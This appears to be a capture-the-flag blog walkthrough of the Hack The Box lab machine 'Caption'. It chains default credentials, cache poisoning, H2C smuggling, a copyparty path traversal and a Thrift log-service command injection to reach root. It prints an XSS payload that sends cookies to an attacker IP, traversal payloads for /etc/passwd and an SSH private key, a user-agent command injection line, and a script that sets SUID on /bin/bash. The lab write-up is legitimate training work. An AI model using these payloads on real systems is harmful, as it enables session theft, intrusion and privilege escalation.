---
title: "Caption Walkthrough(HTB)"
date: 2025-03-12
draft: false
description: "Caption is a Hard-difficulty Linux box, showcasing the chaining of niche vulnerabilities arising from different technologies such as HAProxy and Varnish. It begins with default credentials granting access to GitBucket, which exposes credentials for a web portal login through commits. The application caches a frequently visited page by an admin user, whose session can be hijacked by exploiting Web Cache Deception (WCD) via response poisoning exploited through a Cross-Site Scripting (XSS) payload. HAProxy controls can be bypassed by establishing an HTTP/2 cleartext tunnel, also known as an H2C Smuggling Attack, enabling the exploitation of a locally running service vulnerable to path traversal ([CVE-2023-37474](https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718)). A foothold is gained by reading the SSH ECDSA private key. Root privileges are obtained by exploiting a command injection vulnerability in the Apache Thrift service running as root."
tags: ["Hard", "Linux", "HTB", "hacking", "walkthrough", "web"]
---
## Reconnaissance 
- On scanning the ports we can see that there are three ports open
![scan](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241227201550.png?raw=true)
- We got two web services running. which are on port 80 (caption) and on port 8080 (git bucket)
![gif-two](https://media.giphy.com/media/xTiN0h0Kh5gH7yQYUw/giphy.gif?cid=790b7611k5tpf42ercj3pdfd7v74ngpuqutts89i3ev5886a&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- More importantly after some recon I come to know about a login page on port 80 which is caption, however we don't have the credentials yet so I started digging further 
- The Gitbucket on port 8000 had two repos, interesting isn't it
![repos](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241227204524.png?raw=true)
- The repository files didn't give that much of valuable information. but...
## Enumeration
- I got tired of the repo files so I checked commits, the recent commits were done by user `Administrator` where the old were done by user `root`
![commits](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241227205952.png?raw=true)
- So I tried enumerating the commits further and on accessing the commit `Access control`, I saw credentials in the chage 
![creds](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241227204717.png?raw=true)
- Those creds worked on the login page on caption(port 80), So using the creds I was able to log in on Caption-Portal
- It looked like a typical hack the box page but when I tried accessing `/logs` from the caption-portal it showed me access denied error. But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. 
![permission-lacks](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241227210157.png?raw=true)
- After a while, I found that there is a cache server running along with the web server, which is called `varnish`, Actually we could've learned about this from the source code(repo) too
![caching](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231003216.png?raw=true)
- [Varnish](https://varnish-cache.org/intro/) Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.
- Apparently this caching server will cache the same page for all users for quick loading of contents
- Again after a while I found that when using `X-Forwaded-Host:` header on the request of pages like `/home` and `/firewalls` actually loads it's value on the response and caches the same page for everyone(including admin) using `varnish` caching server.
![caching-response](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241228200520.png?raw=true)

   ![bat](https://media.giphy.com/media/a5viI92PAF89q/giphy.gif?cid=790b76118apvzogro2mhx1p0zqxkaveomwhimia0cv0l5zam&ep=v1_gifs_search&rid=giphy.gif&ct=g)

```js
" </script> <script>new Image().src="https://10.10.14.12:8000/?c="+document.cookie;</script>
```
- So I made and used the the above xss payload to get admin cookie which was successful. 
![cookie](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231003640.png?raw=true)
- Even after including the admin cookie, still haproxy blocking my request to the page `/logs` which was frustrating
![frustrating](https://media.giphy.com/media/4ZrFRwHGl4HTELW801/giphy.gif?cid=790b76112x8olasfzes67tg7z2tgtczzjqoxx5fngotgmp4e&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called [h2csmuggler](https://github.com/BishopFox/h2csmuggler) and using that tool I was easily able to bypass the 403 of `/logs`
- From the response I got the location of logs files
![logs-location](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231011017.png?raw=true)
- After hours of checking the logs files, I came to know that it didn't has anything useful, Full of garbage
```bash
h2csmuggler.py -x http://caption.htb:80 -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo' 'http://caption.htb:80/download<redacted>
```
- See it's garbage contents yourselves
![misery](https://media.giphy.com/media/Kpxjiwbtguize/giphy.gif?cid=790b7611r04ss5f643qnyrby6jislfoaenmxjwiz0kebsahl&ep=v1_gifs_search&rid=giphy.gif&ct=g)
![Pasted image 20241231011324.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231011324.png?raw=true)
- But on visiting the plain url without the logs path it rather reveals something interesting
![Pasted image 20241231011736.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231011736.png?raw=true)
- These `./cpr` folders are looking interesting aren't they
- Researched about them and found a vulnerability in copyparty, Which includes a path traversal vulnerability on versions 1.8.2
The [POC](https://www.exploit-db.com/exploits/51636) looked like this:
```bash
curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
```
- The above path also has SSRF vulnerability
## Exploitation
- Using this plainly didn't work for me 
- But with little twerk, actually have to double encode the payload
- This was my initial payload to read `/etc/passwd`
```path
.cpr//etc/passwd
```
- The Final URL encoded payload:
```bash
%2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64
```
- As this was working, for SSH access I tried to read `id_rsa` for user margo and got nothing, then after some hours I figured that it's not a RSA key that I should look for...
```bash
/.cpr//home/margo/.ssh/id_ecdsa
```
- Logged in with the key and got the {{< keyword >}}  User flag {{< /keyword >}}
![Pasted image 20241231014758.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231014758.png?raw=true)
- Don't worry guys we are halfway through
![50%-complete](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaG94ZjRpeDh4d2Z4ZTExMDQ5aHVuenpjbGRiZzUzb2ZkcjdrcWxlcCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/xUPGcv4cXpq6KNcPEk/giphy.gif)

## Privilege Escalation
- I started enumerating with internal services and we got multiple services but one looks particularly interesting
```bash
ss -tunlp
```
![Pasted image 20241231015117.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231015117.png?raw=true)
- The reason is, there is a code mentioning about port 9090 within the gitbucket's Logservice repo
- ![log-repo](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231015556.png?raw=true)
- So as usual as I reverse forwarded that particular service port to my host machine 
- There were no interface
![Pasted image 20241231015400.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231015400.png?raw=true)
- I was stuck here so I researched the repo again and learned about `Thrift`. Where `Thrift` is used to connect with log services.
- Researched on `Thrift`
{{< details summary="View articles" >}}
[Link-1](https://thrift.apache.org/)
<br>
[Link-2](https://medium.com/devglossary/what-is-apache-thrift-is-it-the-same-as-grpc-2562dba125b0)
{{< /details >}}
- Also after some further enumeration and code review I found a really bad code on the log service
![Pasted image 20241231020054.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231020054.png?raw=true)
- This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp's value. Also it notes the IP address which is not potential for this context
- This can be exploited  by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed.
- For this to be done we need Thrift installed on the local machine.
- Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift.
- When it reads the log file our command will be executed. So I installed Thrift using pip3
```bash
pip3 install thrift
```
- To create the client, first we have to create an api configuration file for the client
- Created a file named `api2.thrift` with this following code
```python
namespace py log_service

exception LogServiceException {
    1: string message
}

service LogService {
    /**
     * Reads the log file from the specified file path.
     * @param filePath - The path of the log file to read.
     * @return string - A message indicating the processing status.
     * @throws LogServiceException - If an error occurs during processing.
     */
    string ReadLogFile(1: string filePath) throws (1: LogServiceException error)
}


```
- Installed compiler using `sudo apt install thrift-compiler` although not recommended
- Ran the following command and created modules directory in python language
```bash
thrift --gen py api2.thrift
```
![Pasted image 20241231021952.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231021952.png?raw=true)
- Inside the directory I created `client.py` file with this code
```python
from thrift import Thrift  
from thrift.transport import TSocket  
from thrift.transport import TTransport  
from thrift.protocol import TBinaryProtocol  
from log_service import LogService  # Import generated Thrift client code  
  
def main():  
    # Set up a transport to the server  
    transport = TSocket.TSocket('localhost', 9090)  
  
    # Buffering for performance  
    transport = TTransport.TBufferedTransport(transport)  
  
    # Using a binary protocol  
    protocol = TBinaryProtocol.TBinaryProtocol(transport)  
  
    # Create a client to use the service  
    client = LogService.Client(protocol)  
  
    # Open the connection  
    transport.open()  
  
    try:  
        # Specify the log file path to process  
        log_file_path = "/tmp/bad.log"  
  
        # Call the remote method ReadLogFile and get the result  
        response = client.ReadLogFile(log_file_path)  
        print("Server response:", response)  
  
    except Thrift.TException as tx:  
        print(f"Thrift exception: {tx}")  
  
    # Close the transport  
    transport.close()  
  
if __name__ == '__main__':  
    main()
```
- After that I created two files
	- One is `bad.log` file with this as content
```bash
999.9.9.9 "user-agent":"'; /bin/bash /tmp/bad.sh #"
```
- Second is `bad.sh` file with this
```bash
chmod +s /bin/bash
```
- Transferred both the files to the `/tmp` folder of the target system and also gave appropriate permissions
    - From the host hosted a python server
![Pasted image 20241231022629.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231022629.png?raw=true)
    - From the target system
![Pasted image 20241231022800.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231022800.png?raw=true)
- All complications are over. 
![it's-Over](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjd4ZHUxbnJoaGV0N3ExNGN4Z29jazhtNThxaW91cHk4dzNqN3A1MiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l0ErLeqamV3UOARsA/giphy.gif)
- By now if client.py is executed it will speak with the Log-service and make it to read the file `/tmp/bad.log`
- As the file contains malicious code. It will make the Log-service to execute a script named `bad.sh` as root. 
- The script will give SUID permissions to `/bin/bash` making it to be executed as root by anyone.
- Fired the script successfully
![Pasted image 20241231023255.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231023255.png?raw=true)
- Our exploit worked.... It was a success
![success](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYnhqbzlsZmd3Y3J3Y3JhcXF0d3lwYnFpb25sdGM0a2h2YjBrYzlueSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/4xpB3eE00FfBm/giphy.gif)
- Executing the `/bin/bash` with preserve flag `-p` gave a shell as root.
- Finally got the {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20241231023524.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241231023524.png?raw=true)

{{< alert icon="circle-info" textColor="#060008" >}}
**Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box.**
{{< /alert >}}

{{< typeit >}}
With honor I have to inform that you are a legend, and you are at the end of this walkthrough, you probably happy right now that this is over. Nah nah not so soon check it out my other posts. Until next time...........
{{< /typeit >}}

![Bye](https://media.giphy.com/media/42D3CxaINsAFemFuId/giphy.gif?cid=790b7611d3khffn504kmuogimg8mwjgifs62qdescfuenizc&ep=v1_gifs_search&rid=giphy.gif&ct=g)
